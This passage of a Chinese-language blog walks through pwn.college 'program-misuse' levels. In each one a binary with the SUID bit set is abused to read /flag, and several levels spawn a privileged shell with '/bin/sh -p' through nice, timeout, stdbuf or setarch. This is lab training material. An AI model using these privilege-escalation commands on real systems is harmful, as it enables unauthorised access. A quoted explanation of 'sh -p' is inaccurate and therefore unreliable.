+</code></pre> <p>emacs也是一个强大的工具，可以学一学。</p> <p>这里退出命令是<c-x> <c-c></p> <h2 id=level9-shows-you-that-an-over-privileged-editor-is-a-very-powerful-tool>level9 Shows you that an over-privileged editor is a very powerful tool!</h2> <pre><code>hacker@program-misuse-level-9:~$ sh file.sh
+Welcome to ./babysuid_level9!
+
+This challenge is part of a series of programs that
+shows you that an over-privileged editor is a very powerful tool, indeed.
+
+I just set the SUID bit on /usr/bin/nano.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level9) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/nano!
+hacker@program-misuse-level-9:~$ nano /flag
+</code></pre> <p>我果然料事如神</p> <pre><code>pwn.college{w4DHxmYT2HQw-wrXkHpQXqNmIWW.0VM1EDL2QjMyMzW}
+</code></pre> <p>退出命令是<c-x></p> <h2 id=level10-requires-you-to-understand-their-output-to-derive-the-flag-from-it>level10 Requires you to understand their output to derive the flag from it!</h2> <p><img alt=切换 src=../image.png> 一句题外话，不同挑战之间无缝切换好快啊，很适合Linux直接用terminal链接！</p> <pre><code>hacker@program-misuse-level-10:~$ sh file.sh
+Welcome to ./babysuid_level10!
+
+This challenge is part of a series of programs that
+require you to understand their output to derive the flag from it.
+
+I just set the SUID bit on /usr/bin/rev.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level10) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/rev!
+</code></pre> <p><code>rev</code>是反序输出的工具</p> <p>但是难不住我</p> <pre><code>hacker@program-misuse-level-10:~$ rev /flag
+}WzMyMjQ2LDE1Ml0.iqRmReNkY5WaIyBZQULv-MYk7kI{egelloc.nwp
+hacker@program-misuse-level-10:~$ rev /flag | rev
+pwn.college{Ik7kYM-vLUQZByIaW5YkNeRmRqi.0lM1EDL2QjMyMzW}
+hacker@program-misuse-level-10:~$
+</code></pre> <h2 id=level11-requires-you-to-understand-their-output-to-derive-the-flag-from-it>level11 Requires you to understand their output to derive the flag from it!</h2> <pre><code>hacker@program-misuse-level-11:~$ sh file.sh
+Welcome to ./babysuid_level11!
+
+This challenge is part of a series of programs that
+require you to understand their output to derive the flag from it.
+
+I just set the SUID bit on /usr/bin/od.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level11) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/od!
+</code></pre> <p><code>od</code>通常用于以八进制或十六进制格式显示文件的内容。</p> <pre><code>hacker@program-misuse-level-11:~$ od -A x -t x1z -v /flag
+000000 70 77 6e 2e 63 6f 6c 6c 65 67 65 7b 73 4b 47 35  &gt;pwn.college{sKG5&lt;
+000010 6d 6b 70 75 44 35 38 63 71 76 44 65 33 32 39 4e  &gt;mkpuD58cqvDe329N&lt;
+000020 57 6c 4f 36 31 41 39 2e 30 31 4d 31 45 44 4c 32  &gt;WlO61A9.01M1EDL2&lt;
+000030 51 6a 4d 79 4d 7a 57 7d 0a                       &gt;QjMyMzW}.&lt;
+000039
+hacker@program-misuse-level-11:~$
+</code></pre> <p>看了文档就会了，这个命令直接写在文档里。</p> <pre><code>pwn.college{sKG5mkpuD58cqvDe329NWlO61A9.01M1EDL2QjMyMzW}
+</code></pre> <h2 id=level12-requires-you-to-understand-their-output-to-derive-the-flag-from-it>level12 Requires you to understand their output to derive the flag from it!</h2> <pre><code>Welcome to ./babysuid_level12!
+
+This challenge is part of a series of programs that
+require you to understand their output to derive the flag from it.
+
+I just set the SUID bit on /usr/bin/hd.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level12) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/hd!
+</code></pre> <p>奇怪的<code>hd</code>工具，十六进制的。</p> <pre><code>hacker@program-misuse-level-12:~$ hd /flag
+00000000  70 77 6e 2e 63 6f 6c 6c  65 67 65 7b 6f 47 7a 69  |pwn.college{oGzi|
+00000010  37 55 30 32 58 54 6c 5f  64 73 6e 50 43 77 73 42  |7U02XTl_dsnPCwsB|
+00000020  52 38 6d 59 54 77 6d 2e  30 46 4e 31 45 44 4c 32  |R8mYTwm.0FN1EDL2|
+00000030  51 6a 4d 79 4d 7a 57 7d  0a                       |QjMyMzW}.|
+00000039
+hacker@program-misuse-level-12:~$ man hd
+</code></pre> <p>这里已经可以直接复制了，但是希望有更简便的形势，去看了文档，但是没太研究明白，瞎整了一个输出</p> <pre><code>hacker@program-misuse-level-12:~$ hd -f /flag
+hd: &quot;pwn.college{oGzi7U02XTl_dsnPCwsBR8mYTwm.0FN1EDL2QjMyMzW}&quot;: bad format
+hacker@program-misuse-level-12:~$
+</code></pre> <h2 id=level13-requires-you-to-understand-their-output-to-derive-the-flag-from-it>level13 Requires you to understand their output to derive the flag from it!</h2> <pre><code>Welcome to ./babysuid_level13!
+
+This challenge is part of a series of programs that
+require you to understand their output to derive the flag from it.
+
+I just set the SUID bit on /usr/bin/xxd.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level13) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/xxd!
+</code></pre> <p><code>xxd</code>，是个二进制的工具。这个我会</p> <pre><code>hacker@program-misuse-level-13:~$ xxd /flag
+00000000: 7077 6e2e 636f 6c6c 6567 657b 4d56 2d59  pwn.college{MV-Y
+00000010: 6e5f 3465 4777 6c63 6f49 5438 4a63 574a  n_4eGwlcoIT8JcWJ
+00000020: 6934 7764 2d53 692e 3056 4e31 4544 4c32  i4wd-Si.0VN1EDL2
+00000030: 516a 4d79 4d7a 577d 0a                   QjMyMzW}.
+</code></pre> <p>然后手动复制...</p> <pre><code>pwn.college{MV-Yn_4eGwlcoIT8JcWJi4wd-Si.0VN1EDL2QjMyMzW}
+</code></pre> <h2 id=level14-requires-you-to-understand-their-output-to-derive-the-flag-from-it>level14 Requires you to understand their output to derive the flag from it!</h2> <pre><code>hacker@program-misuse-level-14:~$ sh file.sh
+Welcome to ./babysuid_level14!
+
+This challenge is part of a series of programs that
+require you to understand their output to derive the flag from it.
+
+I just set the SUID bit on /usr/bin/base32.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level14) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/base32!
+</code></pre> <p><code>base32</code>都出来了,就一个参数 -d</p> <pre><code>hacker@program-misuse-level-14:~$ base32 /flag
+OB3W4LTDN5WGYZLHMV5UCT3NM4ZWGTLYK5YV6SCVOR2XC5CSMF4WM6LML5UWE4ZOGBWE4MKFIRGD
+EULKJV4U26SXPUFA====
+hacker@program-misuse-level-14:~$ base32 /flag | base32 -d
+pwn.college{AOmg3cMxWq_HUtuqtRayfyl_ibs.0lN1EDL2QjMyMzW}
+hacker@program-misuse-level-14:~$
+</code></pre> <p>那我猜下一个是base64</p> <h2 id=level15-requires-you-to-understand-their-output-to-derive-the-flag-from-it>level15 Requires you to understand their output to derive the flag from it!</h2> <pre><code>hacker@program-misuse-level-15:~$ sh file.sh
+Welcome to ./babysuid_level15!
+
+This challenge is part of a series of programs that
+require you to understand their output to derive the flag from it.
+
+I just set the SUID bit on /usr/bin/base64.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level15) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/base64!
+hacker@program-misuse-level-15:~$
+</code></pre> <p>嘿嘿，果然</p> <pre><code>hacker@program-misuse-level-15:~$ base64 /flag | base64 -d
+pwn.college{QvvMGkZ_gpVBCBw1u5dYReqKajl.01N1EDL2QjMyMzW}
+hacker@program-misuse-level-15:~$
+</code></pre> <h2 id=level16-requires-you-to-understand-their-output-to-derive-the-flag-from-it>level16 Requires you to understand their output to derive the flag from it!</h2> <pre><code>hacker@program-misuse-level-16:~$ sh file.sh
+Welcome to ./babysuid_level16!
+
+This challenge is part of a series of programs that
+require you to understand their output to derive the flag from it.
+
+I just set the SUID bit on /usr/bin/split.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level16) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/split!
+</code></pre> <p><code>split</code>是一个分块的工具，但是由于题中的flag很小，还达不到它默认的限度（默认参数需要看手册），因此在运行</p> <pre><code>split /flag
+</code></pre> <p>之后，就会在文件夹之下有个输出文件。</p> <pre><code>hacker@program-misuse-level-16:~$ cat xaa
+pwn.college{oqsgCLV3hcD9AXs5bELwauYQHup.0FO1EDL2QjMyMzW}
+</code></pre> <p><strong>小总结，除了最近基本的进制、ascii等，base32和base64最好可以了解一下这两种编码方式</strong></p> <h2 id=level17-forces-you-to-understand-different-archive-formats>level17 Forces you to understand different archive formats!</h2> <pre><code>hacker@program-misuse-level-17:~$ sh file.sh
+Welcome to ./babysuid_level17!
+
+This challenge is part of a series of programs that
+force you to understand different archive formats.
+
+I just set the SUID bit on /usr/bin/gzip.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level17) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/gzip!
+</code></pre> <p>牛马的<code>gzip</code>，压缩和解压缩，看来后几个都是这个意思</p> <p>然后开始秒题</p> <pre><code>hacker@program-misuse-level-17:~$ gzip -f /flag -t
+hacker@program-misuse-level-17:~$ ls /
+bin   challenge  etc      home  lib32  libx32  mnt  proc  run   srv  tmp  var
+boot  dev        flag.gz  lib   lib64  media   opt  root  sbin  sys  usr
+hacker@program-misuse-level-17:~$ gzip -cd /flag.gz
+pwn.college{QHVq0GV7-f7QFzzNe2jTzkeq6T8.0VO1EDL2QjMyMzW}
+hacker@program-misuse-level-17:~$
+</code></pre> <h2 id=level18-forces-you-to-understand-different-archive-formats>level18 Forces you to understand different archive formats!</h2> <p>开始无聊起来了。。。</p> <pre><code>hacker@program-misuse-level-18:~$ sh file.sh
+Welcome to ./babysuid_level18!
+
+This challenge is part of a series of programs that
+force you to understand different archive formats.
+
+I just set the SUID bit on /usr/bin/bzip2.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level18) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/bzip2!
+</code></pre> <p>然后和上面的命令完全一样，就是压缩的格式和算法不同了</p> <pre><code>hacker@program-misuse-level-18:~$ bzip2 -f  /flag
+hacker@program-misuse-level-18:~$ ls /
+bin   challenge  etc       home  lib32  libx32  mnt  proc  run   srv  tmp  var
+boot  dev        flag.bz2  lib   lib64  media   opt  root  sbin  sys  usr
+hacker@program-misuse-level-18:~$ bzip2 -cd /flag.bz2
+pwn.college{wkf3JjpEoyTnVUz5mUbAtllNMRn.0FM2EDL2QjMyMzW}
+hacker@program-misuse-level-18:~$
+</code></pre> <h2 id=level19-forces-you-to-understand-different-archive-formats>level19 Forces you to understand different archive formats!</h2> <pre><code>Welcome to ./babysuid_level19!
+
+This challenge is part of a series of programs that
+force you to understand different archive formats.
+
+I just set the SUID bit on /usr/bin/zip.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level19) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/zip!
+</code></pre> <p>这几个题可有点儿烦人了啊！</p> <pre><code>hacker@program-misuse-level-19:~$ cat /flag.zip
+PK
+V3199flagUT �dBdux
+                      pwn.college{YFFLGakdSzjIgW7btl64EaiEyDf.0VM2EDL2QjMyMzW}
+PK
+V3199flagUT�dux
+               PKJwhacker@program-misuse-level-19:~$
+</code></pre> <p>正确的方式应该是先解压，但是貌似能直接看，我就没管</p> <h2 id=level20-forces-you-to-understand-different-archive-formats>level20 Forces you to understand different archive formats!</h2> <pre><code>hacker@program-misuse-level-20:~$ sh file.sh
+Welcome to ./babysuid_level20!
+
+This challenge is part of a series of programs that
+force you to understand different archive formats.
+
+I just set the SUID bit on /usr/bin/tar.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level20) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/tar!
+</code></pre> <p><code>tar</code>比较常见。</p> <pre><code>hacker@program-misuse-level-20:~$ tar cf /flag.tar /flag
+tar: Removing leading `/' from member names
+hacker@program-misuse-level-20:~$ ls /
+bin   challenge  etc   flag.tar  lib    lib64   media  opt   root  sbin  sys  usr
+boot  dev        flag  home      lib32  libx32  mnt    proc  run   srv   tmp  var
+hacker@program-misuse-level-20:~$ cat /flag.tar
+flag0000400000000000000000000000007114456374677010423 0ustar  rootrootpwn.college{YNojFHYmMjDXxa2MP_mFcpOEIIo.0lM2EDL2QjMyMzW}
+hacker@program-misuse-level-20:~$
+</code></pre> <p>好像都可以直接用cat看压缩包，那么就比较简单了</p> <h2 id=level21-forces-you-to-understand-different-archive-formats>level21 Forces you to understand different archive formats!</h2> <pre><code>hacker@program-misuse-level-21:~$ sh file.sh
+Welcome to ./babysuid_level21!
+
+This challenge is part of a series of programs that
+force you to understand different archive formats.
+
+I just set the SUID bit on /usr/bin/ar.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level21) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/ar!
+</code></pre> <p><code>ar</code>工具，集合很多文档存成一个文档的工具</p> <pre><code>hacker@program-misuse-level-21:~$ ar rs /flag.a /flag
+ar: creating /flag.a
+hacker@program-misuse-level-21:~$ cat /flag.a
+!&lt;arch&gt;
+flag/           0           0     0     644     57        `
+pwn.college{0vq28yii-jRYCSQP_DtM3bkf8ee.01M2EDL2QjMyMzW}
+
+hacker@program-misuse-level-21:~$
+</code></pre> <h2 id=level22-forces-you-to-understand-different-archive-formats>level22 Forces you to understand different archive formats!</h2> <pre><code>hacker@program-misuse-level-22:~$ sh file.sh
+Welcome to ./babysuid_level22!
+
+This challenge is part of a series of programs that
+force you to understand different archive formats.
+
+I just set the SUID bit on /usr/bin/cpio.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level22) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/cpio!
+</code></pre> <p><code>cpio</code>工具，用于文件备份的</p> <pre><code>hacker@program-misuse-level-22:~$  find /flag | cpio -ov &gt; archive.cpio
+/flag
+1 block
+hacker@program-misuse-level-22:~$ ls /
+bin   challenge  etc   home  lib32  libx32  mnt  proc  run   srv  tmp  var
+boot  dev        flag  lib   lib64  media   opt  root  sbin  sys  usr
+hacker@program-misuse-level-22:~$ ls
+Desktop    Downloads  Pictures  Templates  archive.cpio  file.sh
+Documents  Music      Public    Videos     core          test.py
+hacker@program-misuse-level-22:~$ cat archive.cpio
+�wd�9/flagpwn.college{om324dLj5vHeY7kTe9p_qAFQ1Cy.0FN2EDL2QjMyMzW}
+�
+ TRAILER!!!hacker@program-misuse-level-22:~$
+</code></pre> <h2 id=level23-forces-you-to-understand-different-archive-formats>level23 Forces you to understand different archive formats!</h2> <pre><code>hacker@program-misuse-level-23:~$ sh file.sh
+Welcome to ./babysuid_level23!
+
+This challenge is part of a series of programs that
+force you to understand different archive formats.
+
+I just set the SUID bit on /usr/bin/genisoimage.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level23) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/genisoimage!
+</code></pre> <p><code>genisoimage</code>工具，能看出来作用是建立ISO 9660映像文件</p> <pre><code>er@program-misuse-level-23:~$  genisoimage -sort /flag
+genisoimage: Incorrect sort file format
+        pwn.college{YROFw7Q_KvLF86Vs3WeI_XDvziT.0VN2EDL2QjMyMzW}
+hacker@program-misuse-level-23:~$
+</code></pre> <p><em>这块儿好像cat不太星了，输出会打乱shell</em></p> <p><strong>小总结：倒是知道了很多以前不知道的工具。</strong></p> <h2 id=level24-enables-you-to-read-flags-by-making-them-execute-other-commands>level24 Enables you to read flags by making them execute other commands!</h2> <pre><code>sh hacker@program-misuse-level-24:~$ sh file.sh
+Welcome to ./babysuid_level24!
+
+This challenge is part of a series of programs that
+will enable you to read flags by making them execute other commands.
+
+I just set the SUID bit on /usr/bin/env.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level24) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/env!
+</code></pre> <p>开始有意思起来了。</p> <pre><code>hacker@program-misuse-level-24:~$ env cat /flag
+pwn.college{8rPxiO1f2sBGHUvcT83glFWNSpM.0lN2EDL2QjMyMzW}
+hacker@program-misuse-level-24:~$
+</code></pre> <p>env可以给其他的程序赋权？感觉是这个意思，当然出题人想要的意思应该是需要先设一个shell，然后执行。</p> <h2 id=level25-enables-you-to-read-flags-by-making-them-execute-other-commands>level25 Enables you to read flags by making them execute other commands!</h2> <pre><code>hacker@program-misuse-level-25:~$ sh file.sh
+Welcome to ./babysuid_level25!
+
+This challenge is part of a series of programs that
+will enable you to read flags by making them execute other commands.
+
+I just set the SUID bit on /usr/bin/find.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level25) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/find!
+</code></pre> <p>使用find</p> <pre><code>hacker@program-misuse-level-25:~$ find / -type f -name &quot;flag&quot; -exec cat {} \;
+pwn.college{Uomlfru_u94ZuszsvlNzA0n6x39.01N2EDL2QjMyMzW}
+hacker@program-misuse-level-25:~$
+</code></pre> <p>这里需要考虑的是find只是找到，如何读取？</p> <ul> <li>使用<code>-exec</code></li> </ul> <h2 id=level26-enables-you-to-read-flags-by-making-them-execute-other-commands>level26 Enables you to read flags by making them execute other commands!</h2> <pre><code>hacker@program-misuse-level-26:~$ sh file.sh
+Welcome to ./babysuid_level26!
+
+This challenge is part of a series of programs that
+will enable you to read flags by making them execute other commands.
+
+I just set the SUID bit on /usr/bin/make.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level26) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/make!
+</code></pre> <p>有点儿意思啊，直接出现了GNU Make了</p> <pre><code>hacker@program-misuse-level-26:~$ COMMAND='cat /flag';make -s --eval=$'x:\n\t-'&quot;$COMMAND&quot;
+pwn.college{oYDGLL2PogQjUYR2TV30VTUm-4z.0FO2EDL2QjMyMzW}
+hacker@program-misuse-level-26:~$
+</code></pre> <p>这个搜了一下，然后不光查到了正确答案还发现自己做错了，出题人想要的是 sh -p 这样提权</p> <blockquote> <p>这个命令的作用是启动一个新的shell进程，并将该进程的环境变量设置为当前shell进程的环境变量。</p> <p>具体来说，这个命令包含以下部分：</p> <p>env：这是一个用于执行命令时设置环境变量的工具。在这个命令中，它用于将当前shell进程的所有环境变量传递给新的shell进程。</p> <p>sh：这是一个用于启动shell进程的命令。在这个命令中，它用于启动一个新的shell进程。</p> <p>-p：这是一个选项，用于告诉新的shell进程将其环境变量设置为当前shell进程的环境变量。具体来说，它会将当前shell进程的环境变量从环境变量文件（如/etc/environment、/etc/profile、~/.bashrc等）中读取，并将其设置为新的shell进程的环境变量。</p> <p>因此，这个命令的效果是启动一个新的shell进程，并将其环境变量设置为当前shell进程的环境变量。这可以用于测试shell脚本或命令对环境变量的影响，或者在两个不同的shell进程之间共享环境变量。</p> </blockquote> <p>看起来就是赋权，然后会拿到一个新的shell提示符</p> <h2 id=level27-enables-you-to-read-flags-by-making-them-execute-other-commands>level27 Enables you to read flags by making them execute other commands!</h2> <pre><code>hacker@program-misuse-level-27:~$ sh file.sh
+Welcome to ./babysuid_level27!
+
+This challenge is part of a series of programs that
+will enable you to read flags by making them execute other commands.
+
+I just set the SUID bit on /usr/bin/nice.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level27) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/nice!
+</code></pre> <p><code>nice</code>工具:用于以指定的进程调度优先级启动其他的程序。</p> <pre><code>hacker@program-misuse-level-27:~$ nice /bin/sh -p
+# cat /flag
+pwn.college{celMGA3nJomrVQwA5iPwIY2IORz.0VO2EDL2QjMyMzW}
+#
+</code></pre> <p>这样才是题目想要的，我傻了</p> <h2 id=level28-enables-you-to-read-flags-by-making-them-execute-other-commands>level28 Enables you to read flags by making them execute other commands!</h2> <pre><code>hacker@program-misuse-level-28:~$ sh file.sh
+Welcome to ./babysuid_level28!
+
+This challenge is part of a series of programs that
+will enable you to read flags by making them execute other commands.
+
+I just set the SUID bit on /usr/bin/timeout.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level28) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/timeout!
+</code></pre> <p><code>timeout</code>工具：用来指定时间后杀死进程的。</p> <pre><code>hacker@program-misuse-level-28:~$ timeout 1h /bin/sh -p
+# cat /flag
+pwn.college{sWxHBmerdB7TO79CXDlkRtygh4x.0FM3EDL2QjMyMzW}
+#
+</code></pre> <p>这个需要注意指定一个时间</p> <h2 id=level29-enables-you-to-read-flags-by-making-them-execute-other-commands>level29 Enables you to read flags by making them execute other commands!</h2> <pre><code>hacker@program-misuse-level-29:~$ sh file.sh
+Welcome to ./babysuid_level29!
+
+This challenge is part of a series of programs that
+will enable you to read flags by making them execute other commands.
+
+I just set the SUID bit on /usr/bin/stdbuf.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level29) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/stdbuf!
+</code></pre> <p><code>stdbuf</code>工具：修改标准流的缓冲模式和大小</p> <pre><code>hacker@program-misuse-level-29:~$ stdbuf --input=512K /bin/sh -p
+# cat /flag
+pwn.college{IHf3mOmt5d10g3StOZp5S0AMAfJ.0VM3EDL2QjMyMzW}
+#
+</code></pre> <p>别用man，真的不好用</p> <h2 id=level30-enables-you-to-read-flags-by-making-them-execute-other-commands>level30 Enables you to read flags by making them execute other commands!</h2> <pre><code>hacker@program-misuse-level-30:~$ sh file.sh
+Welcome to ./babysuid_level30!
+
+This challenge is part of a series of programs that
+will enable you to read flags by making them execute other commands.
+
+I just set the SUID bit on /usr/bin/setarch.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level30) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/setarch!
+</code></pre> <p><code>setarch</code>工具: 改变架构的工具</p> <pre><code>hacker@program-misuse-level-30:~$ setarch i386 /bin/sh -p
+# cat /flag
+pwn.college{08T2qH86iHnjvFJb-5bmU9C5kJt.0lM3EDL2QjMyMzW}
+#
+</code></pre> <p>它这个说默认是/bin/sh，可以切i386，在man里写着呢</p> <h2 id=level31-enables-you-to-read-flags-by-making-them-execute-other-commands>level31 Enables you to read flags by making them execute other commands!</h2> <pre><code>hacker@program-misuse-level-31:~$ sh file.sh
+Welcome to ./babysuid_level31!
+
+This challenge is part of a series of programs that
+will enable you to read flags by making them execute other commands.
+
+I just set the SUID bit on /usr/bin/watch.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level31) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/watch!
+</code></pre> <p><code>watch</code>工具：执行命令然后全屏输出</p> <pre><code>hacker@program-misuse-level-31:~$ watch -x cat /flag
+### 使用后会输出到全屏
+pwn.college{UMl5SVp_YjbBiTIgIIiAi7i_5fg.01M3EDL2QjMyMzW}
+</code></pre> <p>很神奇的工具，然而发现tldr不怎么全，只有常见命令，到CTF的环境之中就不太适用了</p> <h2 id=level32-enables-you-to-read-flags-by-making-them-execute-other-commands>level32 Enables you to read flags by making them execute other commands!</h2> <pre><code>hacker@program-misuse-level-32:~$ sh file.sh
+Welcome to ./babysuid_level32!
+
+This challenge is part of a series of programs that
+will enable you to read flags by making them execute other commands.
+
+I just set the SUID bit on /usr/bin/socat.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level32) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/socat!
+</code></pre> <p><code>socat</code>：是个和socket有关的工具。</p> <pre><code>hacker@program-misuse-level-32:~$ socat -u &quot;file:/flag&quot; -
+pwn.college{QKHthQcoA6ncJKsiqFJMZ6ITybE.0FN3EDL2QjMyMzW}
+hacker@program-misuse-level-32:~$
+</code></pre> <h2 id=level33-requires-some-light-programming-to-read-the-flag>level33 Requires some light programming to read the flag.!</h2> <pre><code>hacker@program-misuse-level-33:~$ sh file.sh
+Welcome to ./babysuid_level33!
+
+This challenge is part of a series of programs that
+will require some light programming to read the flag..
+
+I just set the SUID bit on /usr/bin/whiptail.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level33) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/whiptail!
+</code></pre> <p><code>whiptail</code>：展示shell的对话框的工具</p> <pre><code>hacker@program-misuse-level-33:~$ whiptail --textbox /flag 20 40
+pwn.college{4r_plp-YJyPyhT4_GiJQz042S5b.0VN3EDL2QjMyMzW}
+</code></pre> <p>是一个打开对话框的工具，因此思路就是直接展示出来就行了。</p> <h2 id=level34-requires-some-light-programming-to-read-the-flag>level34 Requires some light programming to read the flag.!</h2> <pre><code>hacker@program-misuse-level-34:~$ sh file.sh
+Welcome to ./babysuid_level34!
+
+This challenge is part of a series of programs that
+will require some light programming to read the flag..
+
+I just set the SUID bit on /usr/bin/awk.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level34) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/awk!
+</code></pre> <p>这次是一个我一直都不怎么会用的工具了。。。你妈的</p> <pre><code>hacker@program-misuse-level-34:~$ awk '{print $1}' /flag
+pwn.college{ghdjRlnfhKYn-uhIb2N76siNtG_.0lN3EDL2QjMyMzW}
+hacker@program-misuse-level-34:~$
+</code></pre> <p><code>awk</code>是一个很有用的工具，有时间还是得学一学</p> <h2 id=level35-requires-some-light-programming-to-read-the-flag>level35 Requires some light programming to read the flag.!</h2> <pre><code>hacker@program-misuse-level-35:~$ sh file.sh
+Welcome to ./babysuid_level35!
+
+This challenge is part of a series of programs that
+will require some light programming to read the flag..
+
+I just set the SUID bit on /usr/bin/sed.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level35) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/sed!
+</code></pre> <p>果然，在awk之后我就应该想到是sed</p> <pre><code>hacker@program-misuse-level-35:~$ sed p /flag
+pwn.college{M3upZ8DYRun26uvObOYrzPSdSUO.01N3EDL2QjMyMzW}
+pwn.college{M3upZ8DYRun26uvObOYrzPSdSUO.01N3EDL2QjMyMzW}
+hacker@program-misuse-level-35:~$
+</code></pre> <p>也许我之前操作错了什么，这里不应该是两行flag吧？</p> <h2 id=level36-requires-some-light-programming-to-read-the-flag>level36 Requires some light programming to read the flag.!</h2> <pre><code>hacker@program-misuse-level-36:~$ sh file.sh
+Welcome to ./babysuid_level36!
+
+This challenge is part of a series of programs that
+will require some light programming to read the flag..
+
+I just set the SUID bit on /usr/bin/ed.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level36) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/ed!
+</code></pre> <p><code>ed</code>工具：是个编辑器，是交互式的</p> <pre><code>hacker@program-misuse-level-36:~$ ed /flag
+57
+.p
+pwn.college{QNXzpWhqr3e12Okfu2KRnY5jyxa.0FO3EDL2QjMyMzW}
+</code></pre> <p>显示全文</p> <h2 id=level37-lets-you-get-the-flag-by-doing-tricks-with-permissions>level37 Lets you get the flag by doing tricks with permissions!</h2> <pre><code>hacker@program-misuse-level-37:~$ sh file.sh
+Welcome to ./babysuid_level37!
+
+This challenge is part of a series of programs that
+let you get the flag by doing tricks with permissions.
+
+I just set the SUID bit on /usr/bin/chown.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level37) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/chown!
+</code></pre> <p><code>chown</code>工具：改变文件的所有者和组的</p> <pre><code>hacker@program-misuse-level-37:~$ chown hacker /flag
+hacker@program-misuse-level-37:~$ cat /flag
+pwn.college{49NDHOhwhBEwWccuPUHSxUU0RIE.0VO3EDL2QjMyMzW}
+hacker@program-misuse-level-37:~$
+</code></pre> <p>这就是简单的赋权了</p> <h2 id=level38-lets-you-get-the-flag-by-doing-tricks-with-permissions>level38 Lets you get the flag by doing tricks with permissions!</h2> <pre><code>hacker@program-misuse-level-38:~$ sh file.sh
+Welcome to ./babysuid_level38!
+
+This challenge is part of a series of programs that
+let you get the flag by doing tricks with permissions.
+
+I just set the SUID bit on /usr/bin/chmod.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level38) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/chmod!
+</code></pre> <p>这个，没人不会吧</p> <pre><code>hacker@program-misuse-level-38:~$ chmod 777 /flag
+hacker@program-misuse-level-38:~$ cat /flag
+pwn.college{UtH5piA32tLwQLpCFPRDXuFa98r.0FM4EDL2QjMyMzW}
+hacker@program-misuse-level-38:~$
+</code></pre> <h2 id=level39-lets-you-get-the-flag-by-doing-tricks-with-permissions>level39 Lets you get the flag by doing tricks with permissions!</h2> <pre><code>hacker@program-misuse-level-39:~$ sh file.sh
+Welcome to ./babysuid_level39!
+
+This challenge is part of a series of programs that
+let you get the flag by doing tricks with permissions.
+
+I just set the SUID bit on /usr/bin/cp.
+Try to use it to read the flag!
+
+IMPORTANT: make sure to run me (./babysuid_level39) every time that you restart
+this challenge container to make sure that I set the SUID bit on /usr/bin/cp!
+</code></pre> <p>一开始想搞个硬链接，然后发现不行，然后输出到<a href=https://blog.csdn.net/Dontla/article/details/121200247>标准输出流</a>就行了</p> <pre><code>hacker@program-misuse-level-39:~$ cp /flag /dev/stdout
+pwn.college{Q2azoEz2fXYLZxYkmGAK4PjtrO7.0VM4EDL2QjMyMzW}
+hacker@program-misuse-level-39:~$
